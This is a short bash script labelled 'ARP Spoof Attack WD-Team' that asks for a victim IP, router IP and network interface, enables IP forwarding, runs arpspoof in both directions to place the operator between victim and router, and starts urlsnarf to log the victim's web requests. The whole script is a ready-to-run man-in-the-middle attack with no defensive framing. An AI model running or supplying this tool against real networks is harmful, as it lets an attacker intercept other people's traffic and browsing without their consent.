#!/usr/bin/env bash

echo "----------------------------------"
echo "	ARP Spoof Attack WD-Team"
echo "----------------------------------"

read -p "[#] Enter Victem IP : " vicIP
read -p "[#] Enter Router IP : " routIP
read -p "[#] Enter Your IP : " usrIP
read -p "[#] Enter Net Interface : " iface

sudo sysctl -w net.ipv4.ip_forward=1
sudo xterm -T 'clinet-server' -e "arpspoof -i $iface -t $vicIP $routIP" | sudo xterm -T 'server-client' -e "arpspoof -i $iface -t $routIP $vicIP" | sudo xterm -T '[+] Listenning ......' -e "sudo urlsnarf -i wlan0"
echo "[!] Whene You Done Run : $ sudo sysctl -w net.ipv4.ip_forward=0"